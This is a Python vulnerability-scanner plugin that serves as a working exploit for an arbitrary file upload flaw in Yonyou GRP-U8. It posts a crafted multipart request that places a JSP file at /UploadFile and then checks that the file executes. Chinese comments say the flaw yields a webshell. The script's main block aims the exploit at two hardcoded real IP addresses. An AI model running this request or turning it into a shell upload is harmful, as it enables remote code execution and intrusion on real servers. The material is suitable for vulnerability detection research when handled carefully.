#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name: 用友 GRP-u8系统任意文件上传，可getshell  

#Refer:http://www.wooyun.org/bugs/wooyun-2010-0111406
#Data:2016/1/27  

'''
上传位置是  /UploadFile  
自己构造表单就可以直接上传 getshell  （对 jsp不懂，有些shell运行报错 ）
'''
def assign(service,arg):
    if service=="yongyou_u8":
        return True,arg

def audit(arg):
    raw='''POST /UploadFile HTTP/1.1
Host: 210.44.112.101
Content-Length: 227
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVg9Q1fvRBAApMhqx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8

------WebKitFormBoundaryVg9Q1fvRBAApMhqx
Content-Disposition: form-data; name="rfile_name"; filename="test.jsp"
Content-Type: application/octet-stream

<% out.println("testvul");%>
------WebKitFormBoundaryVg9Q1fvRBAApMhqx--
'''
    code,head,res,errcode,finalurl=curl.curl2(arg+"UploadFile",raw=raw)
    verify_url=arg+"/upload/test.jsp"
    code,head,res,errcode,finalurl=curl.curl2(verify_url)
    if code==200 and  "testvul" in res:
        security_hole('Arbitrary file upload:'+arg+'UploadFile')

if  __name__=="__main__":
    from dummy import *
    audit(assign('yongyou_u8','http://210.44.112.101/')[1])
    audit(assign('yongyou_u8','http://124.128.96.98:8001/')[1])